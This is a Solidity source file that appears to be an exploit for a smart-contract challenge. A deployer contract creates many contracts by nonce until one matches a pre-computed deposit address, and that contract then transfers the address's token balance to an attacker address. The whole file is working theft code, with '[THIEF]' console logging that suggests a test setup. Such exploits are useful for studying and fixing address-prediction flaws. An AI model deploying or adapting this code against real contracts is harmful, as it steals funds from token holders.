pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Token {
	function transfer(address to, uint256 amount) external returns (bool);
	function balanceOf(address account) external returns (uint256);
}

/**
 * The ThiefDeployer contract generates new addresses for the 'stealing' contract that will eventually match the deposit address.
 */
contract ThiefDeployer {
	constructor(address _token, address _attacker, uint256 _tries) {
		for (uint256 id = 0; id < _tries; ++id){
			new ThiefMiner(_token, _attacker, id);
		}
	}
}

/**
 * The ThiefMiner contract tries to sweep the funds to the attacker if its token balance is positive. It will, at one point, have the same address as the deposit address.
 */
contract ThiefMiner {
	constructor (address _token, address _attacker, uint256 _nonce) {
		uint256 balance = Token(_token).balanceOf(address(this));
		console.log("[THIEF] Address generated is", address(this), "with balance", balance);
		if (balance > 0){
			console.log("[THIEF] Sent", balance, "to", _attacker);
			console.log("[THIEF] Deployer", msg.sender, "required nonce", _nonce);
			Token(_token).transfer(_attacker, balance);
		}
	}
}
